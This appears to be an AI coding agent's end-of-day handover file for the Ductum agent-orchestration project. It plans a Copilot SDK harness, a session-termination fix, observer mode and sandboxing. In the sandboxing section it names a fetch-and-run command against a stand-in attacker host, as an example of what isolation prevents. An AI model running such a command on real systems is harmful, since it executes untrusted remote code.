# Session Handover — 2026-04-08 (end of day)

## State on the ground

- **main**: `63541ff` (ductum-onboard skill + SETUP.md + handover). Clean working tree.
- **DB**: 0 specs, 0 tasks, 0 runs. Fully clean.
- **Worktrees**: 0. All 174 stale `ductum/*` branches deleted.
- **Server**: idle, at `http://localhost:4100`. Dashboard at `http://localhost:5173`.
- **Budget**: reverted to `perSpecHardUsd: 100`.

## Priority 1 — GitHub Copilot SDK harness (DEMO TOMORROW — business-critical)

**This is the most important item in the handover.** The user needs to demo Ductum to colleagues at work, dispatching real work against an existing Python project (strm-replication-agent) via the GitHub Copilot SDK. None of the other priorities matter if this doesn't ship.

### The SDK to use

**`@github/copilot-sdk`** — https://github.com/github/copilot-sdk. Official. Supports Node/TS, Python, Go, .NET, Java. Node package name: `@github/copilot-sdk`.

Source: `gh api repos/github/copilot-sdk/contents/nodejs/src` — lives under `nodejs/` in the repo. Use `gh api` to browse the types and README, not WebFetch.

### Why this is a clean port of `codex-sdk.ts`

The Copilot SDK is shaped identically to `@openai/codex-sdk`. The new adapter is a 1:1 port of `packages/harness/src/codex-sdk.ts` with names swapped:

| codex-sdk.ts | @github/copilot-sdk |
|---|---|
| `new Codex({ config: { mcp_servers: ... } })` | `new CopilotClient({ githubToken?, cwd? })` |
| `codex.startThread({ workingDirectory, sandboxMode })` | `client.createSession({ model, onPermissionRequest: approveAll, tools? })` |
| `thread.runStreamed(prompt, { signal })` | `session.send({ prompt })` |
| `for await (const event of events)` | `session.on('event.type', handler)` + `await done` |
| `event.type === 'item.completed'` (command_execution / file_change / agent_message / mcp_tool_call) | `tool.execution_start` / `tool.execution_complete` / `assistant.message` / `assistant.message_delta` |
| `event.type === 'turn.completed'` | `session.usage_info` event |
| resolveCompletion on stream exit | `session.idle` event (maps to `exitReason: 'completed'`) |
| `abortController.abort()` | `session.disconnect()` + `client.stop()` |
| per-spawn MCP HTTP server | `tools: Tool[]` on createSession config — register Ductum's tools directly |

### Quick-start API reference (from the SDK README)

```ts
import { CopilotClient, approveAll } from '@github/copilot-sdk'

// In CopilotSDKHarnessAdapter.spawn():
const client = new CopilotClient({
  cwd: options.workingDir,                 // the Ductum worktree path
  // githubToken optional — SDK picks up gh auth state automatically
})
await client.start()

const session = await client.createSession({
  model: 'gpt-5',                          // or whatever the user configures
  streaming: true,                          // we want incremental activity
  onPermissionRequest: approveAll,          // required. Ductum's Edictum layer
                                            // handles the real authz via MCP tools,
                                            // so approveAll here is safe — the
                                            // agent can only call tools we give it
  tools: [/* Ductum MCP tools */],          // register ductum.workflow/update/complete/etc
})

// Wire event handlers (direct map to postActivity calls):
session.on('assistant.message_delta', (ev) => {
  // streaming text chunk — accumulate for final `text` activity
})
session.on('assistant.message', (ev) => {
  void postActivity(apiUrl, runId, 'text', truncateActivity(ev.data.content))
})
session.on('tool.execution_start', (ev) => {
  void postActivity(apiUrl, runId, 'tool_call', truncateActivity(JSON.stringify(ev.data.args)), ev.data.toolName)
})
session.on('tool.execution_complete', (ev) => {
  void postActivity(apiUrl, runId, 'tool_result', truncateActivity(ev.data.result))
})
session.on('session.usage_info', (ev) => {
  // token accounting
  void postTokens(apiUrl, runId, {
    tokensIn: ev.data.inputTokens ?? 0,
    tokensOut: ev.data.outputTokens ?? 0,
    costUsd: 0, // server computes via computeCacheAwareCost
    cachedTokensIn: ev.data.cachedInputTokens ?? 0,
  })
})
session.on('session.idle', () => {
  // THIS is the clean completion signal
  active.resolveCompletion?.({ exitReason: 'completed', tokensIn, tokensOut, costUsd: 0 })
})
session.on('session.error', (ev) => {
  active.resolveCompletion?.({ exitReason: 'crashed', tokensIn, tokensOut, costUsd: 0 })
})

await session.send({ prompt: `${systemPrompt}\n\n${task.prompt}` })
```

Confirm exact event payload shapes next session via `gh api repos/github/copilot-sdk/contents/nodejs/src/generated/session-events.ts`. The type literals I confirmed exist: `session.start`, `session.idle`, `session.error`, `session.shutdown`, `session.usage_info`, `session.compaction_start`, `session.compaction_complete`, `user.message`, `assistant.message`, `assistant.message_delta`, `assistant.reasoning_delta`, `assistant.turn_start`, `tool.execution_start`, `tool.execution_complete`, `pending_messages.modified`.

### What to build

Create `packages/harness/src/copilot-sdk.ts` by duplicating `codex-sdk.ts`:

```bash
cp packages/harness/src/codex-sdk.ts packages/harness/src/copilot-sdk.ts
```

Then in the copy, rename `CodexSDKHarnessAdapter` → `CopilotSDKHarnessAdapter` and rewrite the SDK-specific sections:

1. **Imports**: swap `@openai/codex-sdk` for `@github/copilot-sdk`. Import `CopilotClient`, `approveAll`, type `SessionEvent`.
2. **`ActiveSession` interface**: add a `client: CopilotClient` field and a `session: CopilotSession` field. Keep the rest (abort controller, heartbeat timer, token accumulators, completion promise, `harnessSessionIdReported`).
3. **`spawn()`** (codex-sdk.ts lines 61-140):
   - Build `apiUrl` and control token same as codex-sdk.
   - `new CopilotClient({ cwd: options.workingDir })` (not the codex `new Codex({ config: { mcp_servers } })` because Copilot gets tools via the `createSession` `tools` option, not via a CLI config).
   - `await client.start()`.
   - `await client.createSession({ model, onPermissionRequest: approveAll, streaming: true, tools: buildDuctumMcpTools(run.id) })` — the `buildDuctumMcpTools` helper needs to be written; it maps the existing Ductum MCP tool definitions (`ductum.workflow`, `ductum.update`, `ductum.complete`, etc. from `packages/mcp/src/tools/`) into the `Tool[]` shape Copilot expects. Study `@github/copilot-sdk`'s `Tool` type via `gh api` first.
   - Wire heartbeat timer same as codex-sdk.
   - Wire event handlers (see quick-start above).
   - Return `HarnessSession`.
4. **`runTurn()`** (codex-sdk.ts lines 155-240): replace the `for await (const event of events)` loop with the Copilot event handler registration above. The `done` promise resolves when `session.idle` fires. Same cleanup pattern in `finally`.
5. **`handleEvent()`** (codex-sdk.ts lines 239-307): delete — Copilot's event system is callback-based, not iterator-based, so event handlers are registered inline in `spawn()` instead of dispatched from a central switch.
6. **`kill()`**: `await active.session.disconnect()` + `await active.client.stop()` + the existing `abortController.abort()` and `cleanup()`.
7. **`cleanup()`**: same as codex-sdk — clear heartbeat, delete from sessions map.

Export from `packages/harness/src/index.ts`:
```ts
export * from './copilot-sdk.js'
```

Register in `packages/api/src/index.ts` around line 153 (after the other `if (harness.XyzHarnessAdapter) {` blocks):
```ts
if (harness.CopilotSDKHarnessAdapter) {
  harnessAdapters.set('copilot-sdk', new harness.CopilotSDKHarnessAdapter(apiUrl))
  log.info('startup', 'Harness: copilot-sdk loaded')
}
```

Add to `packages/harness/package.json` dependencies:
```json
"@github/copilot-sdk": "<exact-version-from-gh-api>"
```

Pin exact version per the supply chain rules in CLAUDE.md — no `^` or `~`. Run `gh api repos/github/copilot-sdk/releases/latest --jq '.tag_name'` to get the current stable version.

### Tools registration (the thing that needs thought)

Copilot's `tools` option on `createSession` takes a `Tool[]` — each entry declares a tool name, description, input schema, and a handler function. Ductum's existing MCP tools live in `packages/mcp/src/tools/*.ts` and are built as MCP server definitions, not Copilot `Tool` shapes.

Two paths:

**A. Wrap the MCP tools as Copilot tools** (cleaner). Write a helper `buildDuctumMcpTools(runId)` that reads the existing MCP tool definitions and produces `Tool[]` with the same name/description/schema but with handlers that call directly into Ductum's repos — bypassing the MCP server entirely for Copilot. Cost: ~100 LOC, a small shim layer.

**B. Point Copilot at an HTTP MCP server** (if Copilot supports it). The SDK might accept `mcpServers` config the way Claude SDK does. Confirm via `gh api repos/github/copilot-sdk/contents/nodejs/src/types.ts` — search for `mcp` or `McpServer`. If supported, reuse the existing per-spawn HTTP MCP server pattern from `codex-sdk.ts` lines 92-102 (where we set `mcp_servers[mcpServerName]` with the URL `${apiUrl}/api/mcp/${run.id}`).

Prefer B if it exists. Fall back to A otherwise.

### Critical rules from the other harnesses

- **All content posted to `postActivity` MUST go through `truncateActivity()` from `./activity-limits.js`.** Never hard-code slice limits.
- **Honor `DUCTUM_HEARTBEAT_INTERVAL_MS` env var** when setting the heartbeat interval (default 30_000).
- **Report the harness session id** via `postHarnessSessionId(apiUrl, runId, session.sessionId)` once `client.start()` returns and `createSession` gives you a session ID. Copilot probably doesn't write a scannable JSONL log like Codex does, but the call is cheap and harmless.
- **Budget pre-check** is handled server-side in `POST /api/runs/:id/tokens` — no harness-side code needed.

### Known hazards for tomorrow

1. **The `ductum_complete` push-loop bug may hit Copilot too.** Priority 2 below is the elegant fix, but it probably won't land before the demo. Workaround in the Copilot adapter: when a `ductum_complete` MCP tool call is observed in the tool execution stream, start a 2-second timer that calls `session.disconnect()`. Document with a `FIXME(priority-2)` comment so it gets replaced when the real fix lands.

2. **Authentication**: SDK picks up auth from `gh auth login` state automatically. If the user is already `gh auth login`'d (check with `gh auth status`), no extra env vars needed. Alternatively: `COPILOT_GITHUB_TOKEN` / `GH_TOKEN` / `GITHUB_TOKEN` env var. Confirm with the user which path they have set up.

3. **Model name**: the README uses `"gpt-5"` as the example. Confirm with the user which model their Copilot plan actually supports before committing to a default in `ductum.yaml`.

4. **The strm-replication-agent project needs Ductum onboarding first.** Use the `ductum-onboard` skill (installed in `.claude/skills/ductum-onboard/` globally + project-local at `/Users/acartagena/project/ductum/.claude/skills/`). With the strm-replication-agent repo as cwd, say "onboard this project to ductum" inside Claude Code. The skill detects the Python stack, generates `.edictum/workflow-profile.yaml` with pytest/ruff/mypy verify commands (read actual commands from the project's pyproject.toml), and prints the `ductum.yaml` block to paste.

### Budget

2-3 hours. It's a port, not a new design. The only substantive thinking is in the tool registration path (option A vs B above).

### Demo-day checklist

- [ ] Copilot adapter compiled + loaded by the API server
- [ ] `ductum.yaml` updated with a `copilot` agent entry pointing at `harness: copilot-sdk`
- [ ] strm-replication-agent onboarded via the skill (workflow profile, gitignore, factory rules)
- [ ] `ductum.yaml` updated with the strm-replication-agent project entry
- [ ] At least one spec imported into the project (can be a small one — add a dataclass, add a util)
- [ ] Factory restarted
- [ ] One live dispatch end-to-end: Copilot agent writes code → verify passes → review passes → you approve → merge lands on a real branch
- [ ] Dashboard shows the whole lineage with stage bars + activity timeline + task graph

---

## Priority 2 — the elegant `ductum_complete` fix

**Why this matters**: every live dispatch this week (P4, impl-016 P1-OFFBYONE) hit the same bug — the agent calls `ductum_complete`, but the SDK session keeps running, so the agent "helpfully" tries `git push`, Edictum blocks push at `implement` stage, and the agent enters an infinite retry loop until a human kills it. impl-016 burned a worktree today because of this. The Copilot SDK harness (Priority 1) will hit this exact bug — the Priority 1 workaround is a 2-second timed abort in the adapter, but the elegant fix is the real answer.

**The fix**: make `ductum_complete` literally terminate the session. Not "eventually end", not "kill on timeout" — the tool call IS the end of the conversation by definition.

### Design

```
agent calls ductum_complete(result="...")
   │
   ├─ 1. MCP handler records completion summary (current behavior)
   ├─ 2. MCP handler returns tool response to the SDK (agent sees "ok")
   └─ 3. After response flushes, handler posts session.end_requested
                                                       │
dispatcher hears event:                                │
   │                                                   │
   ├─ 4. adapter.endSession(sessionId, 'completed')    │
   └─ 5. adapter calls abortController.abort()         │
                                                       │
SDK stream's `for await` loop exits cleanly:          │
   │                                                   │
   ├─ 6. waitForCompletion() resolves with exitReason='completed'
   ├─ 7. handleSessionEnd fires via existing path     │
   └─ 8. Post-completion pipeline runs: verify → review → ship
```

### Why this is elegant (not a hack)

- **`ductum_complete` gets its semantics back.** The name finally matches the behavior: "complete" completes the session.
- **No kill, no error, no timeout.** The SDK stream ends via its own `AbortController`, which is the SDK's native termination path. `exitReason` stays `'completed'`, not `'killed'`.
- **Universal across harnesses.** Claude, Codex SDK, GLM, codex-app-server — all of them loop over an event stream driven by an `AbortController`. Aborting that controller is the universal "done" signal.
- **The agent sees a successful tool call.** From its point of view it called complete, got `{ ok: true }`, and then the session ended. Matches the mental model of clicking "submit" in a web form.
- **No prompt engineering.** No "please STOP after calling complete". The agent's prompt can stay as-is. Guaranteed by construction, not hope.
- **Reuses the existing post-completion pipeline unchanged.** `handleSessionEnd` already does verify → review → ship. We're just making sure it fires promptly.

### Implementation

1. **Add `endSession(runId, reason)` to `ApiContext`** (`packages/api/src/lib/deps.ts`).
   - Delegates to the dispatcher via an event or direct reference.
   - Signature: `endSession(runId: RunId, exitReason: 'completed' | 'killed'): Promise<void>`
2. **Dispatcher exposes `endSession`** (`packages/core/src/dispatcher.ts`).
   - Looks up `activeSessions.get(runId)`.
   - Calls `active.adapter.kill(active.session.sessionId)` but records the exit reason as `'completed'` when called via this path (add an optional `reason` parameter to `adapter.kill` or stash the reason in `active` before the kill).
   - Falls through to `handleSessionEnd` which already handles `exitReason: 'completed'` correctly.
3. **`ductum.complete` handler calls `context.endSession(runId, 'completed')`** at the end of the handler, AFTER returning the tool response.
   - Use `setImmediate()` or `queueMicrotask()` so the tool response is flushed before the abort fires.
   - Location: `packages/mcp/src/tools/lifecycle.ts` around line 69.
4. **Test**: add a dispatcher test that spawns a run, the test harness calls `ductum_complete` via the MCP tool, and asserts the session ends within 1 second without further tool calls.
5. **Bonus cleanup**: delete the `git push` block rule from `workflows/coding-guard.yaml` under the `implement` stage. Once complete is terminal, there's no opportunity to push from implement anyway.

### What to verify live

- Re-import `impl-016-force-fail` (the fix-loop proof spec). Watch it in the dashboard:
  - Round 1 impl: agent writes buggy `countDigits`, commits, calls complete, **session ends within ~1s** instead of looping.
  - Post-completion fires: verify passes, review dispatches, reviewer returns FAIL, fix task spawns.
  - Round 2: fix run lands, review returns PASS, advance to ship.
  - Approve via dashboard, merge hits main.

### Open question to resolve during implementation

**Order of operations when `ductum_complete` fires**: do we abort the session *before* or *after* returning the tool response to the agent?

- **Before**: the agent's tool call never "succeeds" from its perspective because the stream closes mid-response. Clean but the agent might log an error.
- **After** (recommended): the agent sees `{ ok: true }` on its last turn, then the next `for await` iteration aborts cleanly. The tool call is its last successful action. Need to use `setImmediate()` or a `queueMicrotask` to flush the response before the abort.

I recommend **after** — matches how HTTP `Connection: close` works (response sent, then socket closes).

---

## Priority 3 — Observer mode for the workflow runtime

Concrete, small, high-payoff. Edictum's `WorkflowRuntime` already supports observer mode — evaluate rules, record what WOULD block, don't actually enforce. We just don't expose it.

### What to build

1. Add an `observer: bool` field to the `factory.workflow` section of `ductum.yaml` (default `false`).
2. In `packages/core/src/enforce.ts:67`, when constructing a new `WorkflowRuntime`, pass `{ observer: resolvedConfig.observer }` through the constructor.
3. In `authorizeTool()`, when observer mode is on, return `{ allowed: true }` to the caller regardless of the actual rule result, but still record the would-have-blocked decision in `gate_evaluations` with a new column `observed: 1`.
4. Add a new column `observed` (int 0/1 default 0) to `gate_evaluations` via a migration.
5. Dashboard: on the run detail page, add a "would-have-blocked" column to the gate evaluations table. Style the observed rejections differently (dashed border, gray text) so operators can distinguish them from actual blocks.
6. Per-spec override: add `observer: true` to the spec frontmatter so a single spec can run in observer mode even when the factory-wide setting is enforce.

### Why it's worth the time

- Debugging stage advancement goes from "add console.log, restart server, re-dispatch" to "query gate_evaluations table".
- Workflow YAML changes can be validated by replaying recent runs in observer mode before flipping the switch.
- New project onboarding (via the `ductum-onboard` skill) should default to observer mode for the first 3 dispatches so the profile can be tuned without blocking real work.

### Rough budget

2-3 hours. One migration, one enforce.ts change, one dashboard column, one test that asserts observer-mode `authorizeTool` returns allowed but records the decision.

---

## Priority 4 — `handoff-guard`-style per-call validation for `ductum_complete`

**I was wrong in the previous session about dismissing remediation as not fitting Ductum.** The `handoff-guard-ts` pattern at `/Users/acartagena/project/handoff-guard-ts` IS the right shape for Ductum — just at a different scale than the session-level fix-loop.

### The two-level pattern

- **Session scale (already built)**: the fix-loop in `post-completion-router.ts`. Impl → reviewer (different agent) → fix session → reviewer → ship. Each round is a new LLM conversation with full context rebuild. Cost per round: $0.50-$3. Catches correctness, security, style issues.
- **Call scale (missing)**: validate the agent's tool output against a schema BEFORE it lands in the DB, on failure return a structured error so the agent can retry the same call with feedback in-session. No new session, no review agent. Cost per retry: marginal.

The two compose — call-scale remediation catches structural failures (malformed results, missing fields, garbage JSON) so the session-scale fix-loop only fires for correctness issues that a different agent actually needs to review.

### What to build

1. Create `packages/core/src/tool-output-guards.ts` — a small wrapper library modeled on `handoff-guard-ts`'s `guard(options)(fn)` pattern. Takes a zod schema + a function, returns a wrapped function that validates the output and retries on failure with the validation error injected as feedback.
2. Wrap `ductum.complete` in `packages/mcp/src/tools/lifecycle.ts` with a guard schema:
   ```ts
   const CompleteResultSchema = z.object({
     run_id: z.string().optional(),
     result: z.string().min(50, "completion summary must be at least 50 chars — describe what was changed"),
     pr: z.string().url().optional(),
   })
   ```
3. On validation failure, the MCP tool call returns an error with the zod issue message. The agent sees "your completion summary was 12 chars — describe what was changed" and retries `ductum.complete` with a longer summary WITHIN the same session.
4. This is stackable with Priority 2 (session termination) — a successful guarded call triggers the session end, a failed one doesn't (agent retries).
5. Tests: unit tests for the guard wrapper + an MCP tool test that posts a short result, asserts rejection, posts a valid one, asserts acceptance + session termination.

### Why now

Low cost, high ROI. Catches the common "agent called complete with garbage" failure mode that currently burns a full review round. Composes cleanly with Priority 1's session-terminator design. Gets Ductum a piece of the remediation pattern without adopting Edictum's full remediation system (which still doesn't fit — Edictum remediation is destructive, handoff-guard is constructive).

### Rough budget

4-5 hours. Small new library + one integration point + tests.

---

## Priority 5 — Integrate NVIDIA OpenShell as the runtime sandbox layer

This is the proper sandbox story for Ductum. Priority 1 (the dedicated Copilot SDK harness) ships first because the demo is tomorrow — this priority is for the longer-term work of getting real isolation (and, as a bonus, getting the other agent CLIs bundled in a container).

### What NVIDIA OpenShell is

https://github.com/NVIDIA/OpenShell — "safe, private runtime for autonomous AI agents." Open source, NVIDIA-backed, purpose-built for exactly the problem Ductum has.

Architecture:

- **Gateway** — coordinates sandbox lifecycle + auth boundaries
- **Sandbox** — isolated Docker containers with policy-enforced network routing
- **Policy Engine** — declarative YAML policies for filesystem, network, process, and inference-layer constraints
- **Privacy Router** — intercepts model API calls and routes them through controlled backends while keeping sensitive context local

All four components run as a K3s cluster inside a **single Docker container** — no separate Kubernetes installation required. Requires only Docker Desktop / Docker daemon.

### Why this is the right sandbox for Ductum specifically

Two things make OpenShell the correct sandbox integration (better than E2B, Modal, gVisor, etc):

1. **It already ships with the exact harness matrix Ductum targets**: Claude Code, OpenCode, Codex, **GitHub Copilot CLI**, OpenClaw, Ollama. The dedicated Priority 1 Copilot SDK harness is still the right near-term answer (faster to ship, no Docker dependency for the demo), but once OpenShell is integrated there's an additional path: "run the Copilot CLI inside an OpenShell sandbox". Two routes to Copilot, both valid — one for speed, one for isolation.

2. **Declarative YAML policies match Ductum's workflow-profile.yaml pattern.** The OpenShell Policy Engine reads YAML files with filesystem/network/process rules. Ductum's `.edictum/workflow-profile.yaml` is the same shape. The two can share a generator: one Ductum workflow-profile compiles down to both an Edictum contract (for stage advancement + logical rules) AND an OpenShell policy (for runtime isolation + syscall blocking). Same source of truth, two enforcement layers.

The base sandbox includes Python 3.13, Node.js 22, Git, and standard Unix utilities out of the box — so most Ductum target projects (the existing ductum/edictum repos, plus Python projects like strm-replication-agent) can run without custom images.

### The integration shape

New harness adapter: `packages/harness/src/openshell.ts` with a class `OpenShellHarnessAdapter` that:

1. **On spawn**:
   - Calls the OpenShell Gateway API to create a new sandbox, passing a policy derived from the project's `.edictum/workflow-profile.yaml`.
   - Mounts the Ductum worktree directory into the sandbox at `/workspace`.
   - Injects required env vars (`ANTHROPIC_API_KEY`, etc.) via OpenShell's credential injection (never written to disk).
   - Tells the sandbox which harness to launch: `claude-code`, `codex`, `copilot`, etc — determined by the `agents.<name>.harness` field in ductum.yaml.
   - OpenShell starts the requested agent CLI inside the sandbox with `cwd=/workspace`.
2. **During the session**:
   - The agent runs inside the container. All `Bash`/`Read`/`Write` calls are filesystem-bounded to `/workspace` by the Policy Engine.
   - Network calls route through the Privacy Router. Anthropic/OpenAI/Copilot API calls are allowed; everything else is denied by default.
   - Activity streams back to Ductum via OpenShell's Gateway → harness adapter → existing `postActivity()` / `postTokens()` path.
3. **On completion**:
   - Ductum's existing `ductum_complete` flow triggers sandbox termination (ties into Priority 1's session terminator — `adapter.kill` calls the Gateway's "destroy sandbox" endpoint).
   - The worktree on the host filesystem already has the committed diff because `/workspace` was a bind mount. Post-completion pipeline runs verify on the host worktree, no extra copy needed.

### What this gives Ductum for free

- **Real isolation**: process + filesystem + network + syscall-level. No more "agent can `curl evil.com | bash`".
- **Copilot support**: without writing a new harness. OpenShell already has `copilot-cli` baked in.
- **Credential hygiene**: API keys never touch the host filesystem from the agent's perspective.
- **Policy-driven network allowlists**: explicit allowlist of model providers, deny-by-default for everything else. Solves the "agent exfiltrated data to a random URL" class of bugs.
- **Privacy router**: for enterprise deployments where model calls need to go through a proxy (compliance, data residency, audit). Not needed for subscription tier but valuable when Ductum targets enterprise.

### What needs investigation before committing

- **Overhead**: Docker + K3s + sandbox startup time. If cold-start is >10 seconds, the dispatch loop slows down. Warm-pool of pre-started sandboxes is possible but adds complexity.
- **Worktree bind mount vs. sandbox-local filesystem**: does OpenShell's Policy Engine enforce rules on bind-mounted paths, or only on the sandbox's own filesystem? If the policy can't reach the bind mount, the isolation story is weaker.
- **Activity streaming**: how does OpenShell surface tool-call events from inside the sandbox back to the Gateway? If it's only polling, that's a latency hit vs the current direct-SDK streaming.
- **Agent CLI selection**: does OpenShell allow picking which agent binary to run at sandbox creation time, or does each sandbox have one fixed agent? Affects whether we need one sandbox image per agent or a shared base image.

### Budget

Research + first integration: 2-3 focused sessions. Goal: one spec dispatched into an OpenShell sandbox running Claude Code, verified end-to-end, with the Edictum workflow stage advancement still working correctly through the extra indirection.

### How this relates to the higher priorities

- **Priority 1 (Copilot SDK harness) still ships first**. OpenShell is longer-term infrastructure work. The demo tomorrow needs a direct Copilot adapter that runs on the operator's own machine without a Docker/K3s dependency.
- **Priority 2 (ductum_complete terminator)** is a prerequisite even in the sandboxed world — the session lifecycle contract (complete → session ends → post-completion fires) has to work cleanly whether the agent is running locally or inside an OpenShell sandbox.
- **Priority 3 (observer mode)** is orthogonal to sandboxing and faster to ship. Good debug tool regardless.
- **Priority 4 (handoff-guard call-scale validation)** is also orthogonal and faster to ship.
- **Priority 5 (this)** is the long-term story: real isolation, network policy, credential hygiene, privacy router for enterprise. None of it blocks tomorrow.

---

## Priority 6 — Setup docs + onboarding skill (DONE, committed in `63541ff`)

- `docs/SETUP.md` — step-by-step new-machine setup (prereqs, install, env vars, first dispatch, common problems)
- `.claude/skills/ductum-onboard/` — the Claude Code skill that onboards existing projects to Ductum
  - `SKILL.md` — detects stack, detects existing context docs (CLAUDE.md / AGENTS.md / .github/copilot-instructions.md / GEMINI.md / README.md), writes `.edictum/workflow-profile.yaml`, appends factory dispatch section to the primary doc, prints the `ductum.yaml` block
  - `templates/` — `workflow-profile-python.yaml`, `-node.yaml`, `-node-monorepo.yaml`, `-go.yaml`, `-rust.yaml`

Also lives at `~/.claude/skills/ductum-onboard/` so it's available globally.

Nothing to do here — already shipped.

---

## Priority 7 — Minor dispatcher bug

`mergeApprovedRun` doesn't call `markDone` on the impl run when you approve the impl run directly (as opposed to approving a descendant fix run that walks the lineage up). Symptom: the run row stays at `stage='ship'` with `terminal_state=null` after the git merge actually happens. The reconcile tool catches these via git-log grep, but fixing the root cause means reconcile never has to.

Location: `packages/api/src/lib/run-ops.ts` around line 491 (`context.stateMachine.markDone(runId, ...)`).

Verify by stepping through: what happens when you approve a run whose `parentRunId` is null? The parent-chain walk starts at line 501 and walks UP from the current run, so a root-only approve goes through the direct `markDone(runId)` at line 491 but nothing walks DOWN from there. That should be enough. Something else is preventing the write. Investigate.

---

## Priority 8 — Delete the zombie stage rule

Once the Priority 2 `ductum_complete` fix lands, the `git push blocked in implement` rule in `workflows/coding-guard.yaml` is no longer needed. The only way to reach git push will be through `mergeApprovedRun`, which the factory controls. Delete the rule, simplify the workflow.

---

## Strategic note — subscription vs enterprise tier

Ductum today is built for the **subscription tier**: Claude Max, ChatGPT Pro, Z.AI plans. That's why the cost scanner exists (matches the provider's own usage breakdown), why harness adapters wrap specific SDKs directly, why the workflow profile is minimal. This tier is the user and a handful of indie-dev users with the same setup.

**Enterprise tier is a different product surface**, even though it can share most of the codebase. Enterprise won't have a shared Claude Max subscription across 50 developers — they'll have:

- Anthropic / OpenAI / Copilot API keys under a cost center with hard limits
- LangChain / LlamaIndex / CrewAI / AutoGen as the orchestration layer (not direct SDKs)
- Governance + compliance + central audit requirements

For that tier, several Edictum features I called "premature" become load-bearing:

- **Cross-adapter parity** becomes real because enterprise dispatches via LangChain/CrewAI, not direct SDKs. Edictum's "same contract runs across frameworks" promise is suddenly necessary.
- **Audit sinks** (`edictum-api`) become mandatory because Compliance needs a central audit log, not SQLite on one box.
- **Real sandboxing** (OpenShell, Priority 5) becomes mandatory because Security won't sign off on git worktrees.
- **HITL gates** become valuable because enterprise approvals are typed (security / cost / final merge) with RBAC.
- **Observer mode** (Priority 3) becomes essential for procurement pilots — "run it for a week in dry-run and show me what it WOULD have done" is how enterprise evaluates this kind of tool.

**The implication for architecture decisions**: keep Ductum friendly to adopting those features later, even though we don't use them now.

- Do NOT rip out the Edictum layer or replace it with homegrown primitives. The subscription tier doesn't need the extra features, but the enterprise tier will, and keeping Edictum wired means turning them on is a config change, not a rewrite.
- Keep the `HarnessAdapter` interface narrow (`spawn`, `kill`, `isAlive`, streaming activity posts) so a LangChain adapter can slot in without refactoring the dispatcher.
- The `workflow-profile.yaml` + `ductum.yaml` split is already doing the right thing — project-level customization is declarative.
- The cost scanner is subscription-tier specific but degrades cleanly to OpenRouter-list pricing for enterprise API-key use. No removal needed.

Ductum is basically structured as a **subscription shell over a governance kernel**, where the kernel is Edictum. Flipping the enterprise features on later is a config change, not a refactor. Don't optimize the kernel away just because the current tier doesn't exercise all of it.

---

## The bug diary (things to watch for regressions on)

- **Auto-commit before rebase** (fixed in `c9f1f4b`) — codex-sdk leaves files uncommitted; the post-completion router detects and commits via `auto-commit.ts`. Don't remove.
- **Cache-aware delta pricing** (fixed in `782309e`) — `computeCacheAwareCost` in `model-pricing.ts` is the delta-path correct price when the scanner has nothing. Tests in `model-pricing.test.ts`.
- **Phantom `@modelcontextprotocol/sdk` dep** (fixed in `d01394a`) — `packages/api` was importing the SDK without declaring it; worked only because the user had a global install. Don't remove the declaration.
- **Reconcile orphaned runs** (fixed in `b8074f8`) — non-terminal runs with stale heartbeats (>1h) + no live session are marked failed. Default threshold is `DUCTUM_ACTIVITY_MAX_BYTES`… wait no, that's different. It's in `reconcile.ts` under `orphanThresholdSeconds`.
- **Activity content cap** (fixed in `eed3d19`) — every harness funnels through `truncateActivity()`. If you add a new harness, don't hard-code a slice, use the helper.
- **Use `gh api` for anything on github.com** — not WebFetch. `gh api repos/<org>/<repo>/contents/<path>` is faster, works on private repos, and returns structured responses. Last session I nearly missed that `@github/copilot-sdk` existed because I was using WebFetch-first and guessing at URLs. For github.com: `gh` first, always.

---

## What to read before starting next session

1. **This file** (you're doing it).
2. **`packages/harness/src/codex-sdk.ts`** — the template for Priority 1 (the Copilot SDK harness). Read `runTurn` + `handleEvent` carefully. This is the exact shape the new adapter needs.
3. **`packages/harness/src/types.ts`** — the `HarnessAdapter` / `HarnessSession` / `HarnessSessionResult` interface you're implementing.
4. **`packages/harness/src/activity-limits.ts`** — the `truncateActivity()` helper every new harness must use for content posts.
5. **`packages/api/src/index.ts` lines 117-157** — the adapter registration block. You'll add the Copilot adapter here.
6. **`.claude/skills/ductum-onboard/SKILL.md`** — the onboarding skill. You'll use it on the strm-replication-agent project to generate its `.edictum/workflow-profile.yaml`.
7. **`docs/SETUP.md`** — the setup doc. Useful for reminding yourself what "a clean install" looks like if you're explaining Ductum to a colleague tomorrow.
8. **`packages/mcp/src/tools/lifecycle.ts`** — location of the `ductum.complete` handler for Priority 2 (the session terminator).
9. **`packages/core/src/dispatcher.ts` lines 280-414** — the dispatch + session lifecycle code that both priorities touch.

## What NOT to do

- ❌ Don't implement the `ductum_complete` fix as "kill on complete" — that's the ugly option. The elegant version (session aborts cleanly via `AbortController`, exitReason stays `completed`) is the right path.
- ❌ Don't add a prompt-level workaround ("please stop after calling complete"). It relies on model obedience.
- ❌ Don't modify `ductum.yaml` from code. It's the user's config file.
- ❌ Don't generate `CLAUDE.md` / `AGENTS.md` files for projects you're onboarding. The `ductum-onboard` skill detects what exists and uses it.

## Fast start for next session

```bash
cd /Users/acartagena/project/ductum

# Is it still running?
curl -sf http://localhost:4100/api/health && echo " OK" || echo " DOWN"

# If down:
export CLAUDE_CODE_OAUTH_TOKEN=$(grep CLAUDE_CODE_OAUTH_TOKEN ~/.zshrc | head -1 | cut -d= -f2)
export ZAI_API_KEY=$(grep ZAI_API_KEY ~/.zshrc | head -1 | sed 's/.*=//' | tr -d '"')
nohup node scripts/serve.mjs > /tmp/ductum-serve.log 2>&1 &
disown
sleep 12
curl -sf http://localhost:4100/api/health && echo " OK"

# Re-read this file first
cat .claude/handover.md

# Priority 1 — Copilot SDK harness (the demo is tomorrow)
# 1. Confirm with the user which Copilot SDK package to use
# 2. Copy packages/harness/src/codex-sdk.ts as the template
cp packages/harness/src/codex-sdk.ts packages/harness/src/copilot-sdk.ts
$EDITOR packages/harness/src/copilot-sdk.ts
# 3. Register the adapter
$EDITOR packages/harness/src/index.ts
$EDITOR packages/api/src/index.ts
# 4. Add a `copilot` agent to ductum.yaml
# 5. Onboard strm-replication-agent via the skill (or with cwd=strm-replication-agent, say "onboard this project to ductum")
# 6. Add strm-replication-agent to ductum.yaml
# 7. Restart the server
# 8. Dispatch a test spec and watch it
```
